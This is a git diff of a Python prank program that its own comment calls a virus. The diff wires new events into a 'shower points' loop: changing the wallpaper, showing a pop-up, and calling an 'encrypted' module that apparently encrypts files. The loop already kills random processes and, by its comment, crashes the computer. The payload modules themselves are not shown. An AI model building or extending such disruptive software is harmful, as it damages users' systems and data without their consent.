@@ -1,16 +1,21 @@
 from app_processes import isRunning, nerdyProcessPoints, terminateRandNerdProcess
 from addRandomGrassFiles import main as randGrassFileMain
+from change_wallpaper import change_wallpaper
+from initial_pop_up_window import initial_pop_up_run
 from lawnmower import main as lawnmowerMain
+from encrypted import main as encryptedMain
 import random
 import time
 import os
 
 #Showerpoints related constants
 
-STARTINGSP = 150
+STARTINGSP = 180
 IDLESPDEC = 0.25
 SHUTDOWNSP = 0
-LAWNMOWERSP = 100
+
+LAWNMOWERSP = 140
+DECRYPTSP = 160
 
 SPLVLS = [float('inf'), 120, 90, 60, 30, SHUTDOWNSP] #In order to be at level n you must have shower points between the values n-1 and n.
 ## The final lvl is unreachable since the virus crashes your computer then , and only is there so SPLVLS[currLvl+1] is always defined
@@ -27,7 +32,7 @@ SPWARNINGS = ["How about you take a break",
 
 showerPoints = STARTINGSP
 currLvl = 4 #Level n corresponds to values in (n-1)th index of array, 4 possible levels
-events = [terminateRandNerdProcess, randGrassFileMain]
+events = [terminateRandNerdProcess, randGrassFileMain, encryptedMain]
 
 
 def adjustLevel():
@@ -78,6 +83,10 @@ def rewards():
 
 
 terminateRandNerdProcess()
+
+change_wallpaper()
+initial_pop_up_run()
+
 while True:
     lowerShowerScale()
     if (showerPoints <= SHUTDOWNSP):
